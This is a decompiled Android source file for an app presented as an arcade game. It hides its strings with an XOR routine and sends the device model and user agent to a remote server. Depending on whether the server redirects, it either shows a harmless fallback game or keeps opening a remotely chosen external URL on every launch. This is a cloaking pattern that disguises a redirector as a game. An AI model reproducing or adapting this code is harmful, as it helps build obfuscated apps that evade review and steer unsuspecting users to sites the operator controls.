package com.luckyarcade.spinthrow;

import K.C0;
import K.E0;
import T.v;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import com.luckyarcade.spinthrow.MainActivity;
import com.luckyarcade.spinthrow.databinding.ActivityMainBinding;
import g.AbstractActivityC0159k;
import i1.o;
import i1.r;
import i1.s;
import i1.t;
import i1.u;
import i1.w;
import i1.y;
import i1.z;
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Pattern;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0159k {
    private final N0.b _fallbackIntent$delegate;
    private final N0.b binding$delegate;
    private SharedPreferences prefs;
    private String redirectUrl;
    private final String _pName = d(new byte[]{4, -68, 22});
    private final String _pKey = d(new byte[]{21, -81, 3, -38});
    private final N0.b _httpClient$delegate = new N0.e(new i());

    public final class DataCallback implements i1.e {
        private final String prefsKey;
        final /* synthetic */ MainActivity this$0;

        public DataCallback(MainActivity mainActivity, String str) {
            X0.f.e(str, "prefsKey");
            this.this$0 = mainActivity;
            this.prefsKey = str;
        }

        /* JADX INFO: Access modifiers changed from: private */
        public static final void onResponse$lambda$2(String str, String str2, MainActivity mainActivity, String str3, String str4, DataCallback dataCallback) {
            if (e1.d.B0(str, str2)) {
                if (e1.d.B0(str3, str4)) {
                    mainActivity.loadFallbackGame();
                    return;
                } else {
                    mainActivity.loadFallbackGame();
                    return;
                }
            }
            SharedPreferences sharedPreferences = mainActivity.prefs;
            if (sharedPreferences == null) {
                X0.f.h("prefs");
                throw null;
            }
            SharedPreferences.Editor edit = sharedPreferences.edit();
            edit.putString(dataCallback.prefsKey, str);
            edit.apply();
            mainActivity.redirectUrl = str;
            mainActivity.openExternal(str);
        }

        @Override // i1.e
        public void onFailure(i1.d dVar, IOException iOException) {
            X0.f.e(dVar, "call");
            X0.f.e(iOException, "e");
            MainActivity mainActivity = this.this$0;
            mainActivity.runOnUiThread(new e(mainActivity, 2));
        }

        /* JADX WARN: Code restructure failed: missing block: B:23:0x0077, code lost:
        
            if (r2 == null) goto L28;
         */
        /* JADX WARN: Removed duplicated region for block: B:31:0x0073 A[EXC_TOP_SPLITTER, SYNTHETIC] */
        @Override // i1.e
        /*
            Code decompiled incorrectly, please refer to instructions dump.
        */
        public void onResponse(i1.d dVar, y yVar) {
            String str;
            s sVar;
            Charset charset;
            String str2;
            X0.f.e(dVar, "call");
            X0.f.e(yVar, "response");
            final String d2 = this.this$0.d(new byte[]{16, -75, 3, -35, 2, -88, 2, -104, 3, -65, 7});
            final String d3 = this.this$0.d(new byte[]{69, -87, 5, -41, 19, -81, 2, -108, 93, -8, 30, -35, 69});
            final String str3 = yVar.f2796a.f2780a.h;
            z zVar = yVar.f2802g;
            if (zVar != null) {
                v1.h h = zVar.h();
                try {
                    switch (zVar.f2807a) {
                        case 0:
                            sVar = (s) zVar.f2809c;
                            break;
                        default:
                            String str4 = (String) zVar.f2809c;
                            if (str4 != null) {
                                Pattern pattern = s.f2726c;
                                try {
                                    sVar = r.f(str4);
                                    break;
                                } catch (IllegalArgumentException unused) {
                                }
                            }
                            sVar = null;
                            break;
                    }
                    if (sVar != null) {
                        charset = e1.a.f2375a;
                        String[] strArr = sVar.f2729b;
                        int i = 0;
                        int F = q1.l.F(0, strArr.length - 1, 2);
                        if (F >= 0) {
                            while (!e1.l.v0(strArr[i], "charset")) {
                                if (i != F) {
                                    i += 2;
                                }
                            }
                            str2 = strArr[i + 1];
                            if (str2 != null) {
                                try {
                                    charset = Charset.forName(str2);
                                } catch (IllegalArgumentException unused2) {
                                }
                            }
                        }
                        str2 = null;
                        if (str2 != null) {
                        }
                    }
                    charset = e1.a.f2375a;
                    str = h.f(j1.b.q(h, charset));
                    q1.d.k(h, null);
                } finally {
                }
            } else {
                str = "";
            }
            final String str5 = str;
            final MainActivity mainActivity = this.this$0;
            mainActivity.runOnUiThread(new Runnable() { // from class: com.luckyarcade.spinthrow.j
                @Override // java.lang.Runnable
                public final void run() {
                    MainActivity.DataCallback.onResponse$lambda$2(str3, d2, mainActivity, str5, d3, this);
                }
            });
        }
    }

    public MainActivity() {
        final int i = 0;
        this.binding$delegate = new N0.e(new W0.a(this) { // from class: com.luckyarcade.spinthrow.h

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f2081b;

            {
                this.f2081b = this;
            }

            @Override // W0.a
            public final Object a() {
                ActivityMainBinding binding_delegate$lambda$0;
                Intent _fallbackIntent_delegate$lambda$2;
                switch (i) {
                    case 0:
                        binding_delegate$lambda$0 = MainActivity.binding_delegate$lambda$0(this.f2081b);
                        return binding_delegate$lambda$0;
                    default:
                        _fallbackIntent_delegate$lambda$2 = MainActivity._fallbackIntent_delegate$lambda$2(this.f2081b);
                        return _fallbackIntent_delegate$lambda$2;
                }
            }
        });
        final int i2 = 1;
        this._fallbackIntent$delegate = new N0.e(new W0.a(this) { // from class: com.luckyarcade.spinthrow.h

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f2081b;

            {
                this.f2081b = this;
            }

            @Override // W0.a
            public final Object a() {
                ActivityMainBinding binding_delegate$lambda$0;
                Intent _fallbackIntent_delegate$lambda$2;
                switch (i2) {
                    case 0:
                        binding_delegate$lambda$0 = MainActivity.binding_delegate$lambda$0(this.f2081b);
                        return binding_delegate$lambda$0;
                    default:
                        _fallbackIntent_delegate$lambda$2 = MainActivity._fallbackIntent_delegate$lambda$2(this.f2081b);
                        return _fallbackIntent_delegate$lambda$2;
                }
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final Intent _fallbackIntent_delegate$lambda$2(MainActivity mainActivity) {
        return new Intent(mainActivity, (Class<?>) MainActivity2.class);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final u _httpClient_delegate$lambda$1() {
        return new u(new t());
    }

    public static final /* synthetic */ void access$loadFallbackGame(MainActivity mainActivity) {
        mainActivity.loadFallbackGame();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final ActivityMainBinding binding_delegate$lambda$0(MainActivity mainActivity) {
        return ActivityMainBinding.inflate(mainActivity.getLayoutInflater());
    }

    private final w buildRequest(String str) {
        v vVar = new v(4);
        X0.f.e(str, "url");
        if (e1.l.z0(str, "ws:", true)) {
            String substring = str.substring(3);
            X0.f.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (e1.l.z0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            X0.f.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        X0.f.e(str, "<this>");
        o oVar = new o();
        oVar.c(null, str);
        vVar.f824a = oVar.a();
        String d2 = d(new byte[]{63, -9, 53, -45, 17, -77, 18, -45, 74, -105, 30, -46, 2, -74});
        String str2 = Build.MODEL;
        X0.f.d(str2, "MODEL");
        vVar.p(d2, str2);
        vVar.p(d(new byte[]{38, -71, 18, -45, 23, -82, 92, -6, 6, -76, 22, -61, 6, -67, 20}), d(new byte[]{2, -76, 92, -29, 52, -10, 20, -40, 92, -85, 76, -122, 73, -29}));
        String d3 = d(new byte[]{50, -87, 20, -60, 74, -101, 22, -45, 9, -82});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        X0.f.d(defaultUserAgent, "getDefaultUserAgent(...)");
        vVar.p(d3, defaultUserAgent);
        return vVar.f();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final String d(byte[] bArr) {
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        while (i < length) {
            int i3 = i2 + 1;
            int i4 = i2 % 4;
            arrayList.add(Byte.valueOf((byte) ((i4 != 0 ? i4 != 1 ? i4 != 2 ? 182 : 113 : 218 : 103) ^ (bArr[i] & 255))));
            i++;
            i2 = i3;
        }
        return new String(O0.h.f0(arrayList), e1.a.f2375a);
    }

    /* JADX WARN: Multi-variable type inference failed */
    private final void enableFullscreen() {
        C0 c02;
        WindowInsetsController insetsController;
        q1.l.n0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            E0 e02 = new E0(insetsController, dVar);
            e02.h = window;
            c02 = e02;
        } else {
            c02 = new C0(window, dVar);
        }
        c02.J();
        c02.q0();
    }

    private final void fetchAndLoad() {
        m1.g gVar;
        String packageName = getPackageName();
        String d2 = d(new byte[]{21, -81, 3, -38});
        String d3 = d(new byte[]{88, -69, 1, -58, 90});
        String packageName2 = getPackageName();
        X0.f.d(packageName2, "getPackageName(...)");
        w buildRequest = buildRequest(new RequestHelper(packageName2, this).buildUrl() + d3 + packageName);
        u uVar = get_httpClient();
        uVar.getClass();
        X0.f.e(buildRequest, "request");
        m1.j jVar = new m1.j(uVar, buildRequest);
        DataCallback dataCallback = new DataCallback(this, d2);
        if (!jVar.f3577e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3964a;
        jVar.f3578f = n.f3964a.g();
        v vVar = uVar.f2750a;
        m1.g gVar2 = new m1.g(jVar, dataCallback);
        vVar.getClass();
        synchronized (vVar) {
            ((ArrayDeque) vVar.f825b).add(gVar2);
            String str = buildRequest.f2780a.f2719d;
            Iterator it = ((ArrayDeque) vVar.f826c).iterator();
            while (true) {
                if (!it.hasNext()) {
                    Iterator it2 = ((ArrayDeque) vVar.f825b).iterator();
                    while (true) {
                        if (!it2.hasNext()) {
                            gVar = null;
                            break;
                        } else {
                            gVar = (m1.g) it2.next();
                            if (X0.f.a(gVar.f3570c.f3574b.f2780a.f2719d, str)) {
                                break;
                            }
                        }
                    }
                } else {
                    gVar = (m1.g) it.next();
                    if (X0.f.a(gVar.f3570c.f3574b.f2780a.f2719d, str)) {
                        break;
                    }
                }
            }
            if (gVar != null) {
                gVar2.f3569b = gVar.f3569b;
            }
        }
        vVar.t();
    }

    private final ActivityMainBinding getBinding() {
        return (ActivityMainBinding) ((N0.e) this.binding$delegate).a();
    }

    private final Intent get_fallbackIntent() {
        return (Intent) ((N0.e) this._fallbackIntent$delegate).a();
    }

    private final u get_httpClient() {
        return (u) ((N0.e) this._httpClient$delegate).a();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void loadFallbackGame() {
        startActivity(get_fallbackIntent());
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void openExternal(String str) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            loadFallbackGame();
        }
    }

    @Override // androidx.fragment.app.AbstractActivityC0064v, a.p, z.j, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.prefs = getSharedPreferences(this._pName, 0);
        enableFullscreen();
        setContentView(getBinding().getRoot());
        SharedPreferences sharedPreferences = this.prefs;
        if (sharedPreferences == null) {
            X0.f.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this._pKey, null);
        if (string == null || e1.d.H0(string)) {
            fetchAndLoad();
        } else {
            this.redirectUrl = string;
            openExternal(string);
        }
    }

    @Override // androidx.fragment.app.AbstractActivityC0064v, android.app.Activity
    public void onResume() {
        super.onResume();
        String str = this.redirectUrl;
        if (str != null) {
            openExternal(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            enableFullscreen();
        }
    }
}
